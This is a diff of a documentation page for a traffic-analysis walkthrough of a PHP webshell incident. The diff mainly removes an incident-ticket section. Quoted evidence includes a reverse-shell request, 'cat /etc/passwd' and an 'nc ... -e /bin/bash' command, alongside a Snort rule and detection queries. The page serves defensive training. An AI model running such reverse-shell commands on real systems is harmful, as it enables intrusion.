@@ -2208,6 +2208,8 @@
       
         
       
+        
+      
     
     
     
@@ -2335,7 +2337,7 @@
   <span class="md-ellipsis">
     
   
-    Arkime-Only Walkthrough — Script Downloader to Credential Theft, TLS C2 and an Incident Ticket
+    Arkime-Only Walkthrough — Script Downloader to Credential Theft and TLS C2
   
 
     
@@ -2447,7 +2449,7 @@
   <span class="md-ellipsis">
     
   
-    Back to the Present — From Network Baselining to a .bit C2, a Tech Support Scam Pop-up, Snort Rules and a Ticket (Arkime + Splunk + Snort)
+    Back to the Present — From Network Baselining to a .bit C2, a Tech Support Scam Pop-up and Snort Rules (Arkime + Splunk + Snort)
   
 
     
@@ -2861,17 +2863,6 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#ticket" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Incident ticket
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
   <a href="#query-sheet" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -2928,6 +2919,34 @@
     
   
     Sorting through the alerts — hacked church site to a fake Chrome update, a WScript C2, a 349 KB payload and failed follow-on C2 (Splunk first, Arkime second)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../alerts-on-3-hosts-neutrino-cryptowall-js-downloader/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Alerts on 3 different hosts — EK drive-by to CryptoWall, a malspam JS downloader and a harmless redirect (Splunk first, Arkime second)
   
 
     
@@ -11579,17 +11598,6 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#ticket" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Incident ticket
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
   <a href="#query-sheet" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -11692,13 +11700,6 @@
       
       
       
-        <a href="../../../tags/#tag:ticket" class="md-tag">ticket</a>
-      
-    
-      
-      
-      
-      
         <a href="../../../tags/#tag:webshell" class="md-tag">webshell</a>
       
     
@@ -11752,7 +11753,7 @@
 </tr>
 <tr>
 <td><strong>Deliverables</strong></td>
-<td>Analysis, one Snort rule, one short incident ticket (txt)</td>
+<td>Analysis, one Snort rule</td>
 </tr>
 <tr>
 <td><strong>Related pages</strong></td>
@@ -11762,7 +11763,7 @@
 </table>
 <div class="admonition tip">
 <p class="admonition-title">How to read this page</p>
-<p>Same order as the analysis: <strong>baselining → odd signs → HTTP → connections and files → Arkime content → initial access → Snort → ticket</strong>. New SPL commands and fields are explained where they first appear. The <strong>Question</strong> boxes are real questions from the session.</p>
+<p>Same order as the analysis: <strong>baselining → odd signs → HTTP → connections and files → Arkime content → initial access → Snort</strong>. New SPL commands and fields are explained where they first appear. The <strong>Question</strong> boxes are real questions from the session.</p>
 </div>
 <div class="admonition warning">
 <p class="admonition-title">The indicators on this page are real</p>
@@ -12016,7 +12017,7 @@
 </span><span id="__span-14-13"><a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a>09:56:35  rev_option=PHP Reverse Shell&amp;my_ip=192.168.1.101&amp;my_port=4444  ★
 </span></code></pre></div>
 <p>The last three lines matter most. A <strong>reverse shell</strong> makes the server (.100) <strong>connect out</strong> to the attacker (.102 or .101) on port 4444. If it works, the attacker gets a real command shell instead of a web page. Two tries to .102, then the target changes to <strong>192.168.1.101</strong>, a LAN host that hardly appears elsewhere.</p>
-<p><strong>82.98.86.178 is not C2.</strong> Every webshell page loads <code>/images/background.gif</code> from 82.98.86.178 (<code>www.ajithkp560.aaaaaaaa[.]com</code>) and <code>jquery-latest.js</code> from 94.31.29.54 (<code>code.jquery[.]com</code>). The Referer is always <code>minishell.php</code>: these are <strong>resources embedded in the webshell page</strong> — the background image comes from the webshell author's site. No commands travel there. In the ticket it is "an external resource loaded by the webshell page" — still a good detection clue.</p>
+<p><strong>82.98.86.178 is not C2.</strong> Every webshell page loads <code>/images/background.gif</code> from 82.98.86.178 (<code>www.ajithkp560.aaaaaaaa[.]com</code>) and <code>jquery-latest.js</code> from 94.31.29.54 (<code>code.jquery[.]com</code>). The Referer is always <code>minishell.php</code>: these are <strong>resources embedded in the webshell page</strong> — the background image comes from the webshell author's site. No commands travel there. In the report it is "an external resource loaded by the webshell page" — still a good detection clue.</p>
 <p><strong>Other notes:</strong></p>
 <ul>
 <li>09:57:49 GET to <code>dynupdate.noip[.]com</code> with User-Agent <code>DUC v4.1.1 ... Service</code>: the <strong>No-IP Dynamic Update Client</strong> is installed as a service on .102. It keeps a domain name pointing at a changing home IP — legitimate software, but also used by attackers to host listeners. Together with 173.192.194.69:5938 (TeamViewer) at 09:54:08, worth asking whether someone was remote-controlling .102. Neither is linked to the webshell activity by evidence.</li>
@@ -12201,7 +12202,7 @@
 <p>No — not in this capture. Initial access here means <strong>how <code>minishell.php</code> got onto the server</strong>. Three reasons:</p>
 <p><strong>1. The webshell was there before the capture.</strong> The first request from .102 to .100:55555 is <code>GET /</code> at 09:53:35, followed by <code>/icons/blank.gif</code>, <code>folder.gif</code>, <code>unknown.gif</code>, <code>text.gif</code>, <code>tar.gif</code> — the icons of an <strong>Apache directory listing</strong> (shown when a folder has no index.html). Four seconds later <code>GET /minishell.php</code> has Referer <code>http://192.168.1.100:55555/</code>: it was <strong>clicked in the listing</strong>. The file already existed.</p>
 <p><strong>2. No upload of <code>minishell.php</code>.</strong> The files the server received are <code>cerber4.PNG</code> and small form fields only. No PUT/POST, FTP or SCP carrying the webshell.</p>
-<p><strong>3. A lead: the .100 ↔ .101 SSH session</strong> was already open before the capture (OTH). It could be how the webshell was placed, but it is encrypted, so it stays a possibility in the ticket.</p>
+<p><strong>3. A lead: the .100 ↔ .101 SSH session</strong> was already open before the capture (OTH). It could be how the webshell was placed, but it is encrypted, so it stays a possibility in the report.</p>
 </div>
 <p>Confirm that nothing reached .100 before the listing:</p>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>index=zeek sourcetype=zeek:http id_resp_h=192.168.1.100
@@ -12231,7 +12232,7 @@
 <li>CyberChef: drop the file into <strong>Input</strong>, recipe <strong>Gunzip</strong> (add <strong>Render HTML</strong> to see it as a table), and read the date next to <code>minishell.php</code>.</li>
 </ol>
 <p><strong>If no link appears:</strong> download <strong>Destination Raw</strong> (headers + body), CyberChef <strong>Extract Files</strong> (tick GZIP) to cut out the gzip part (it searches for the <code>1f 8b</code> start marker), save it, then <strong>Gunzip</strong>.</p>
-<p>In this case the download did not work, so the ticket says "Initial access not in capture" without a date.</p>
+<p>In this case the download did not work, so the report says "Initial access not in capture" without a date.</p>
 </div>
 <hr>
 <h2 id="snort">Step 7 — One Snort rule<a class="headerlink" href="#snort" title="Permanent link">¶</a></h2>
@@ -12343,176 +12344,33 @@
 </tbody>
 </table>
 <hr>
-<h2 id="ticket">Incident ticket<a class="headerlink" href="#ticket" title="Permanent link">¶</a></h2>
-<p>The impacted machine is the <strong>web server .100</strong>; .102 and .101 are <strong>lateral sources</strong> (internal attack sources). Key findings only, simple English.</p>
-<p><a class="md-button" href="../files/170120_wittyserver_ticket.txt"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 20h14v-2H5m14-9h-4V3H9v6H5l7 7z"></path></svg></span> Download the ticket as a txt file</a></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a># Traffic Analysis Ticket – 170120 – wittyserver (192.168.1.100)
-</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>
-</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>Operator name "Sung" and operator log times are placeholders — replace with your actual operator name and analysis times.
-</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>Ticket links (Inv##) are placeholders.
-</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>
-</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>====================================================================
-</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>TICKET 1 – PHP webshell (minishell.php) use and reverse shell on web server
-</span><span id="__span-30-8"><a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a>====================================================================
-</span><span id="__span-30-9"><a id="__codelineno-30-9" name="__codelineno-30-9" href="#__codelineno-30-9"></a>
-</span><span id="__span-30-10"><a id="__codelineno-30-10" name="__codelineno-30-10" href="#__codelineno-30-10"></a>#INDEX ENTRY#
-</span><span id="__span-30-11"><a id="__codelineno-30-11" name="__codelineno-30-11" href="#__codelineno-30-11"></a>
-</span><span id="__span-30-12"><a id="__codelineno-30-12" name="__codelineno-30-12" href="#__codelineno-30-12"></a>[] – 261123 2328 – 192.168.1.100 wittyserver – PHP webshell (minishell.php) used from 192.168.1.102, file upload, command run and reverse shell to 192.168.1.101:4444 – http://ticket:9001/p/Inv##
-</span><span id="__span-30-13"><a id="__codelineno-30-13" name="__codelineno-30-13" href="#__codelineno-30-13"></a>
-</span><span id="__span-30-14"><a id="__codelineno-30-14" name="__codelineno-30-14" href="#__codelineno-30-14"></a>
-</span><span id="__span-30-15"><a id="__codelineno-30-15" name="__codelineno-30-15" href="#__codelineno-30-15"></a>#FINAL SUMMARY OF TICKET# (End of Mission / Closing of Ticket – MC ENTRY ONLY)
-</span><span id="__span-30-16"><a id="__codelineno-30-16" name="__codelineno-30-16" href="#__codelineno-30-16"></a>
-</span><span id="__span-30-17"><a id="__codelineno-30-17" name="__codelineno-30-17" href="#__codelineno-30-17"></a>
-</span><span id="__span-30-18"><a id="__codelineno-30-18" name="__codelineno-30-18" href="#__codelineno-30-18"></a>
-</span><span id="__span-30-19"><a id="__codelineno-30-19" name="__codelineno-30-19" href="#__codelineno-30-19"></a>#TICKET METADATA#
-</span><span id="__span-30-20"><a id="__codelineno-30-20" name="__codelineno-30-20" href="#__codelineno-30-20"></a>
-</span><span id="__span-30-21"><a id="__codelineno-30-21" name="__codelineno-30-21" href="#__codelineno-30-21"></a>OPERATOR: Sung
-</span><span id="__span-30-22"><a id="__codelineno-30-22" name="__codelineno-30-22" href="#__codelineno-30-22"></a>
-</span><span id="__span-30-23"><a id="__codelineno-30-23" name="__codelineno-30-23" href="#__codelineno-30-23"></a>TIME OF INCIDENT: 170120 09:53:39 UTC
-</span><span id="__span-30-24"><a id="__codelineno-30-24" name="__codelineno-30-24" href="#__codelineno-30-24"></a>
-</span><span id="__span-30-25"><a id="__codelineno-30-25" name="__codelineno-30-25" href="#__codelineno-30-25"></a>RELATED TICKETS:
-</span><span id="__span-30-26"><a id="__codelineno-30-26" name="__codelineno-30-26" href="#__codelineno-30-26"></a>
-</span><span id="__span-30-27"><a id="__codelineno-30-27" name="__codelineno-30-27" href="#__codelineno-30-27"></a>
-</span><span id="__span-30-28"><a id="__codelineno-30-28" name="__codelineno-30-28" href="#__codelineno-30-28"></a>DESCRIPTION OF INVESTIGATION:
-</span><span id="__span-30-29"><a id="__codelineno-30-29" name="__codelineno-30-29" href="#__codelineno-30-29"></a>
-</span><span id="__span-30-30"><a id="__codelineno-30-30" name="__codelineno-30-30" href="#__codelineno-30-30"></a>At 170120 09:53:39 UTC 192.168.1.102 (Windows 10, Chrome) connected via http (port 55555) to web server wittyserver (192.168.1.100, Kali Linux) and used the PHP webshell minishell.php (login user "ry4wn"). Through the webshell it uploaded cerber4.PNG (a real PNG image) to /tmp and ran "cat /etc/passwd".
-</span><span id="__span-30-31"><a id="__codelineno-30-31" name="__codelineno-30-31" href="#__codelineno-30-31"></a>
-</span><span id="__span-30-32"><a id="__codelineno-30-32" name="__codelineno-30-32" href="#__codelineno-30-32"></a>At 09:56:35 the webshell opened a PHP reverse shell from 192.168.1.100 to 192.168.1.101:4444 (earlier tries to 192.168.1.102:4444 failed). The shell ran for 2 min as www-data: passwd file read, files listed and "nc -nv 192.168.1.100 5555 -e /bin/bash" run. No root access seen. Initial access not in capture – minishell.php was already on the server. Host analysis required.
-</span><span id="__span-30-33"><a id="__codelineno-30-33" name="__codelineno-30-33" href="#__codelineno-30-33"></a>
-</span><span id="__span-30-34"><a id="__codelineno-30-34" name="__codelineno-30-34" href="#__codelineno-30-34"></a>
-</span><span id="__span-30-35"><a id="__codelineno-30-35" name="__codelineno-30-35" href="#__codelineno-30-35"></a>#IMPACTED INTERNAL MACHINES#
-</span><span id="__span-30-36"><a id="__codelineno-30-36" name="__codelineno-30-36" href="#__codelineno-30-36"></a>
-</span><span id="__span-30-37"><a id="__codelineno-30-37" name="__codelineno-30-37" href="#__codelineno-30-37"></a>INTERNAL IP/s &amp; HOSTNAME/s:
-</span><span id="__span-30-38"><a id="__codelineno-30-38" name="__codelineno-30-38" href="#__codelineno-30-38"></a>
-</span><span id="__span-30-39"><a id="__codelineno-30-39" name="__codelineno-30-39" href="#__codelineno-30-39"></a>192.168.1.100 wittyserver (MAC 6c:0b:84:6a:1d:d8) – Kali Linux web server, Apache/2.4.18 on port 55555
-</span><span id="__span-30-40"><a id="__codelineno-30-40" name="__codelineno-30-40" href="#__codelineno-30-40"></a>
-</span><span id="__span-30-41"><a id="__codelineno-30-41" name="__codelineno-30-41" href="#__codelineno-30-41"></a>INTERNAL SOURCE PORT/s: (If Ephemeral Leave Blank.)
-</span><span id="__span-30-42"><a id="__codelineno-30-42" name="__codelineno-30-42" href="#__codelineno-30-42"></a>
-</span><span id="__span-30-43"><a id="__codelineno-30-43" name="__codelineno-30-43" href="#__codelineno-30-43"></a>INTERNAL DESTINATION PORT/s:
-</span><span id="__span-30-44"><a id="__codelineno-30-44" name="__codelineno-30-44" href="#__codelineno-30-44"></a>
-</span><span id="__span-30-45"><a id="__codelineno-30-45" name="__codelineno-30-45" href="#__codelineno-30-45"></a>Port 55555 – HTTP (webshell)
-</span><span id="__span-30-46"><a id="__codelineno-30-46" name="__codelineno-30-46" href="#__codelineno-30-46"></a>
-</span><span id="__span-30-47"><a id="__codelineno-30-47" name="__codelineno-30-47" href="#__codelineno-30-47"></a>LATERAL SOURCE PORT/s: (If Ephemeral Leave Blank unless required)
-</span><span id="__span-30-48"><a id="__codelineno-30-48" name="__codelineno-30-48" href="#__codelineno-30-48"></a>
-</span><span id="__span-30-49"><a id="__codelineno-30-49" name="__codelineno-30-49" href="#__codelineno-30-49"></a>192.168.1.102 (MAC 90:e6:ba:96:43:32, Windows 10, possible hostname RY4WN-PC) – webshell operator
-</span><span id="__span-30-50"><a id="__codelineno-30-50" name="__codelineno-30-50" href="#__codelineno-30-50"></a>192.168.1.101 – reverse shell listener
-</span><span id="__span-30-51"><a id="__codelineno-30-51" name="__codelineno-30-51" href="#__codelineno-30-51"></a>
-</span><span id="__span-30-52"><a id="__codelineno-30-52" name="__codelineno-30-52" href="#__codelineno-30-52"></a>LATERAL DESTINATION PORT/s:
-</span><span id="__span-30-53"><a id="__codelineno-30-53" name="__codelineno-30-53" href="#__codelineno-30-53"></a>
-</span><span id="__span-30-54"><a id="__codelineno-30-54" name="__codelineno-30-54" href="#__codelineno-30-54"></a>Port 55555 – HTTP (192.168.1.102 -&gt; 192.168.1.100, webshell)
-</span><span id="__span-30-55"><a id="__codelineno-30-55" name="__codelineno-30-55" href="#__codelineno-30-55"></a>Port 4444 – TCP (192.168.1.100 -&gt; 192.168.1.101, reverse shell)
-</span><span id="__span-30-56"><a id="__codelineno-30-56" name="__codelineno-30-56" href="#__codelineno-30-56"></a>
-</span><span id="__span-30-57"><a id="__codelineno-30-57" name="__codelineno-30-57" href="#__codelineno-30-57"></a>
-</span><span id="__span-30-58"><a id="__codelineno-30-58" name="__codelineno-30-58" href="#__codelineno-30-58"></a>#EXTERNAL MACHINES#
-</span><span id="__span-30-59"><a id="__codelineno-30-59" name="__codelineno-30-59" href="#__codelineno-30-59"></a>
-</span><span id="__span-30-60"><a id="__codelineno-30-60" name="__codelineno-30-60" href="#__codelineno-30-60"></a>EXTERNAL IP/s &amp; HOSTNAME/s:
-</span><span id="__span-30-61"><a id="__codelineno-30-61" name="__codelineno-30-61" href="#__codelineno-30-61"></a>
-</span><span id="__span-30-62"><a id="__codelineno-30-62" name="__codelineno-30-62" href="#__codelineno-30-62"></a>82.98.86.178 (www.ajithkp560.aaaaaaaa[.]com) – background image loaded by every webshell page (webshell author site, not C2)
-</span><span id="__span-30-63"><a id="__codelineno-30-63" name="__codelineno-30-63" href="#__codelineno-30-63"></a>
-</span><span id="__span-30-64"><a id="__codelineno-30-64" name="__codelineno-30-64" href="#__codelineno-30-64"></a>EXTERNAL SOURCE PORT/s: (If Ephemeral Leave Blank.)
-</span><span id="__span-30-65"><a id="__codelineno-30-65" name="__codelineno-30-65" href="#__codelineno-30-65"></a>
-</span><span id="__span-30-66"><a id="__codelineno-30-66" name="__codelineno-30-66" href="#__codelineno-30-66"></a>EXTERNAL DESTINATION PORT/s: (If Ephemeral Leave Blank.)
-</span><span id="__span-30-67"><a id="__codelineno-30-67" name="__codelineno-30-67" href="#__codelineno-30-67"></a>
-</span><span id="__span-30-68"><a id="__codelineno-30-68" name="__codelineno-30-68" href="#__codelineno-30-68"></a>Port 80 – HTTP (webshell page image)
-</span><span id="__span-30-69"><a id="__codelineno-30-69" name="__codelineno-30-69" href="#__codelineno-30-69"></a>
-</span><span id="__span-30-70"><a id="__codelineno-30-70" name="__codelineno-30-70" href="#__codelineno-30-70"></a>
-</span><span id="__span-30-71"><a id="__codelineno-30-71" name="__codelineno-30-71" href="#__codelineno-30-71"></a>#SEARCH QUERIES#
-</span><span id="__span-30-72"><a id="__codelineno-30-72" name="__codelineno-30-72" href="#__codelineno-30-72"></a>
-</span><span id="__span-30-73"><a id="__codelineno-30-73" name="__codelineno-30-73" href="#__codelineno-30-73"></a>ARKIME: (Format= [What Command Finds] - &lt;Command&gt;)
-</span><span id="__span-30-74"><a id="__codelineno-30-74" name="__codelineno-30-74" href="#__codelineno-30-74"></a>
-</span><span id="__span-30-75"><a id="__codelineno-30-75" name="__codelineno-30-75" href="#__codelineno-30-75"></a>[Webshell requests] - ip.dst == 192.168.1.100 &amp;&amp; port.dst == 55555 &amp;&amp; http.uri == *minishell.php*
-</span><span id="__span-30-76"><a id="__codelineno-30-76" name="__codelineno-30-76" href="#__codelineno-30-76"></a>
-</span><span id="__span-30-77"><a id="__codelineno-30-77" name="__codelineno-30-77" href="#__codelineno-30-77"></a>[Reverse shell sessions] - ip.src == 192.168.1.100 &amp;&amp; port.dst == 4444
-</span><span id="__span-30-78"><a id="__codelineno-30-78" name="__codelineno-30-78" href="#__codelineno-30-78"></a>
-</span><span id="__span-30-79"><a id="__codelineno-30-79" name="__codelineno-30-79" href="#__codelineno-30-79"></a>SPLUNK: (Format= [What Command Finds] - &lt;Command&gt;)
-</span><span id="__span-30-80"><a id="__codelineno-30-80" name="__codelineno-30-80" href="#__codelineno-30-80"></a>
-</span><span id="__span-30-81"><a id="__codelineno-30-81" name="__codelineno-30-81" href="#__codelineno-30-81"></a>[Webshell requests] - index=zeek sourcetype=zeek:http id_resp_h=192.168.1.100 uri="/minishell.php*"
-</span><span id="__span-30-82"><a id="__codelineno-30-82" name="__codelineno-30-82" href="#__codelineno-30-82"></a>
-</span><span id="__span-30-83"><a id="__codelineno-30-83" name="__codelineno-30-83" href="#__codelineno-30-83"></a>[Reverse shell connections] - index=zeek sourcetype=zeek:conn id_orig_h=192.168.1.100 id_resp_p=4444
-</span><span id="__span-30-84"><a id="__codelineno-30-84" name="__codelineno-30-84" href="#__codelineno-30-84"></a>
-</span><span id="__span-30-85"><a id="__codelineno-30-85" name="__codelineno-30-85" href="#__codelineno-30-85"></a>SNORT: (Format= [What Command Finds] - &lt;Command&gt;)
-</span><span id="__span-30-86"><a id="__codelineno-30-86" name="__codelineno-30-86" href="#__codelineno-30-86"></a>
-</span><span id="__span-30-87"><a id="__codelineno-30-87" name="__codelineno-30-87" href="#__codelineno-30-87"></a>[minishell.php webshell via http] - alert tcp $HOME_NET any -&gt; $HOME_NET 55555 (msg:"minishell.php webshell access - Sung"; content:"minishell.php"; nocase; sid:1000031; rev:1;)
-</span><span id="__span-30-88"><a id="__codelineno-30-88" name="__codelineno-30-88" href="#__codelineno-30-88"></a>
-</span><span id="__span-30-89"><a id="__codelineno-30-89" name="__codelineno-30-89" href="#__codelineno-30-89"></a>
-</span><span id="__span-30-90"><a id="__codelineno-30-90" name="__codelineno-30-90" href="#__codelineno-30-90"></a>#EVIDENCE LOCATIONS#
-</span><span id="__span-30-91"><a id="__codelineno-30-91" name="__codelineno-30-91" href="#__codelineno-30-91"></a>
-</span><span id="__span-30-92"><a id="__codelineno-30-92" name="__codelineno-30-92" href="#__codelineno-30-92"></a>Team&lt;#&gt;: /home/&lt;username&gt;/evidence/170120_minishell_php_webshell.pcap
-</span><span id="__span-30-93"><a id="__codelineno-30-93" name="__codelineno-30-93" href="#__codelineno-30-93"></a>Team&lt;#&gt;: /home/&lt;username&gt;/evidence/170120_reverse_shell_4444.pcap
-</span><span id="__span-30-94"><a id="__codelineno-30-94" name="__codelineno-30-94" href="#__codelineno-30-94"></a>
-</span><span id="__span-30-95"><a id="__codelineno-30-95" name="__codelineno-30-95" href="#__codelineno-30-95"></a>
-</span><span id="__span-30-96"><a id="__codelineno-30-96" name="__codelineno-30-96" href="#__codelineno-30-96"></a>#OFFICIAL LOGGING AND ARTEFACTS#
-</span><span id="__span-30-97"><a id="__codelineno-30-97" name="__codelineno-30-97" href="#__codelineno-30-97"></a>
-</span><span id="__span-30-98"><a id="__codelineno-30-98" name="__codelineno-30-98" href="#__codelineno-30-98"></a>#OPERATOR LOG#
-</span><span id="__span-30-99"><a id="__codelineno-30-99" name="__codelineno-30-99" href="#__codelineno-30-99"></a>
-</span><span id="__span-30-100"><a id="__codelineno-30-100" name="__codelineno-30-100" href="#__codelineno-30-100"></a>[2328 261123, Sung] – Investigating HTTP requests from 192.168.1.102 to 192.168.1.100:55555 (minishell.php) – Found – Further Analysis Required
-</span><span id="__span-30-101"><a id="__codelineno-30-101" name="__codelineno-30-101" href="#__codelineno-30-101"></a>
-</span><span id="__span-30-102"><a id="__codelineno-30-102" name="__codelineno-30-102" href="#__codelineno-30-102"></a>[2335 261123, Sung] – Looking for reverse shell connections and file uploads to 192.168.1.100 – Found – Further Analysis Required
-</span><span id="__span-30-103"><a id="__codelineno-30-103" name="__codelineno-30-103" href="#__codelineno-30-103"></a>
-</span><span id="__span-30-104"><a id="__codelineno-30-104" name="__codelineno-30-104" href="#__codelineno-30-104"></a>[2353 261123, Sung] – Reviewing reverse shell commands and uploaded file in Arkime – Found
-</span><span id="__span-30-105"><a id="__codelineno-30-105" name="__codelineno-30-105" href="#__codelineno-30-105"></a>
-</span><span id="__span-30-106"><a id="__codelineno-30-106" name="__codelineno-30-106" href="#__codelineno-30-106"></a>[2359 261123, Sung] – Looking for how minishell.php was placed on 192.168.1.100 (initial access) – Not Found
-</span><span id="__span-30-107"><a id="__codelineno-30-107" name="__codelineno-30-107" href="#__codelineno-30-107"></a>
-</span><span id="__span-30-108"><a id="__codelineno-30-108" name="__codelineno-30-108" href="#__codelineno-30-108"></a>
-</span><span id="__span-30-109"><a id="__codelineno-30-109" name="__codelineno-30-109" href="#__codelineno-30-109"></a>#TOOL OUTPUT / ANALYST NOTES#
-</span><span id="__span-30-110"><a id="__codelineno-30-110" name="__codelineno-30-110" href="#__codelineno-30-110"></a>
-</span><span id="__span-30-111"><a id="__codelineno-30-111" name="__codelineno-30-111" href="#__codelineno-30-111"></a>[2328 261123, Sung] Webshell use: 192.168.1.102 opened minishell.php from the Apache directory listing on port 55555, then used its browse, upload, command and reverse shell features. Login cookie pass value is the MD5 of "password".
-</span><span id="__span-30-112"><a id="__codelineno-30-112" name="__codelineno-30-112" href="#__codelineno-30-112"></a>
-</span><span id="__span-30-113"><a id="__codelineno-30-113" name="__codelineno-30-113" href="#__codelineno-30-113"></a>    170120 09:53:39 UTC  192.168.1.102         192.168.1.100  55555  GET   /minishell.php  200  Referer: http://192.168.1.100:55555/
-</span><span id="__span-30-114"><a id="__codelineno-30-114" name="__codelineno-30-114" href="#__codelineno-30-114"></a>    170120 09:54:47 UTC  192.168.1.102  56133  192.168.1.100  55555  POST  /minishell.php?path=/tmp  upload_f filename="cerber4.PNG"  23125 B
-</span><span id="__span-30-115"><a id="__codelineno-30-115" name="__codelineno-30-115" href="#__codelineno-30-115"></a>    170120 09:55:04 UTC  192.168.1.102  56136  192.168.1.100  55555  GET   /minishell.php?path=/var/www/html&amp;cmdexe=cat+/etc/passwd  200
-</span><span id="__span-30-116"><a id="__codelineno-30-116" name="__codelineno-30-116" href="#__codelineno-30-116"></a>    170120 09:56:35 UTC  192.168.1.102         192.168.1.100  55555  GET   /minishell.php?rev_option=PHP+Reverse+Shell&amp;my_ip=192.168.1.101&amp;my_port=4444
-</span><span id="__span-30-117"><a id="__codelineno-30-117" name="__codelineno-30-117" href="#__codelineno-30-117"></a>    Cookie: user=ry4wn; pass=5f4dcc3b5aa765d61d8327deb882cf99   Server: Apache/2.4.18 (Debian)
-</span><span id="__span-30-118"><a id="__codelineno-30-118" name="__codelineno-30-118" href="#__codelineno-30-118"></a>
-</span><span id="__span-30-119"><a id="__codelineno-30-119" name="__codelineno-30-119" href="#__codelineno-30-119"></a>[2335 261123, Sung] Reverse shell: tries to 192.168.1.102:4444 got no answer (S0). Connection to 192.168.1.101:4444 succeeded (SF) and lasted 120 s.
-</span><span id="__span-30-120"><a id="__codelineno-30-120" name="__codelineno-30-120" href="#__codelineno-30-120"></a>
-</span><span id="__span-30-121"><a id="__codelineno-30-121" name="__codelineno-30-121" href="#__codelineno-30-121"></a>    170120 09:56:05 UTC  192.168.1.100  39336  192.168.1.102  4444  S0  (repeated until 09:56:42)
-</span><span id="__span-30-122"><a id="__codelineno-30-122" name="__codelineno-30-122" href="#__codelineno-30-122"></a>    170120 09:56:35 UTC  192.168.1.100  57978  192.168.1.101  4444  SF  120.7 s  sent 4336 B / recv 77 B
-</span><span id="__span-30-123"><a id="__codelineno-30-123" name="__codelineno-30-123" href="#__codelineno-30-123"></a>
-</span><span id="__span-30-124"><a id="__codelineno-30-124" name="__codelineno-30-124" href="#__codelineno-30-124"></a>[2353 261123, Sung] Reverse shell is clear text. Shell ran as www-data. cerber4.PNG confirmed in /tmp. nc to the server itself on port 5555 is not visible on the network – host check required.
-</span><span id="__span-30-125"><a id="__codelineno-30-125" name="__codelineno-30-125" href="#__codelineno-30-125"></a>
-</span><span id="__span-30-126"><a id="__codelineno-30-126" name="__codelineno-30-126" href="#__codelineno-30-126"></a>    Linux wittyserver 4.3.0-kali1-amd64 #1 SMP Debian 4.3.3-5kali4 (2016-01-13) x86_64 GNU/Linux
-</span><span id="__span-30-127"><a id="__codelineno-30-127" name="__codelineno-30-127" href="#__codelineno-30-127"></a>    uid=33(www-data) gid=33(www-data) groups=33(www-data)
-</span><span id="__span-30-128"><a id="__codelineno-30-128" name="__codelineno-30-128" href="#__codelineno-30-128"></a>    Commands: cat /etc/passwd | ls | id | cd /tmp | ls | nc -nv 192.168.1.100 5555 -e /bin/bash | exit
-</span><span id="__span-30-129"><a id="__codelineno-30-129" name="__codelineno-30-129" href="#__codelineno-30-129"></a>    Output: (UNKNOWN) [192.168.1.100] 5555 (?) open
-</span><span id="__span-30-130"><a id="__codelineno-30-130" name="__codelineno-30-130" href="#__codelineno-30-130"></a>
-</span><span id="__span-30-131"><a id="__codelineno-30-131" name="__codelineno-30-131" href="#__codelineno-30-131"></a>[2359 261123, Sung] First request to 192.168.1.100 is GET / (directory listing) at 09:53:35 – no upload of minishell.php in capture. An SSH session between 192.168.1.100 and 192.168.1.101:22 was already open before the capture (OTH) – possible access path, encrypted. Host check required: Apache logs, minishell.php file date, /tmp, port 5555 listener.
-</span></code></pre></div>
-<p>How the fields were chosen:</p>
-<ul>
-<li><strong>IMPACTED INTERNAL MACHINES</strong> — wittyserver (192.168.1.100).</li>
-<li><strong>LATERAL</strong> — .102 (webshell operator) and .101 (reverse shell listener), with ports 55555 and 4444.</li>
-<li><strong>EXTERNAL MACHINES</strong> — only 82.98.86.178: not C2, but a reliable clue for spotting minishell.php. TeamViewer and No-IP were left out: no evidence links them to the attack.</li>
-<li><code>nc ... 5555</code> and the pre-existing SSH session cannot be finished from the network, so they are marked "host check required". Initial access is "Not Found" with the reasons.</li>
-</ul>
-<hr>
 <h2 id="query-sheet">Copy-ready queries<a class="headerlink" href="#query-sheet" title="Permanent link">¶</a></h2>
 <p><strong>Splunk (Zeek)</strong> — add <code>pcap_case="&lt;case&gt;"</code> if several PCAPs are loaded.</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>index=zeek | stats count AS events min(ts) AS first max(ts) AS last BY sourcetype | eval first=strftime(first, "%Y-%m-%d %H:%M:%S"), last=strftime(last, "%Y-%m-%d %H:%M:%S") | sort - events
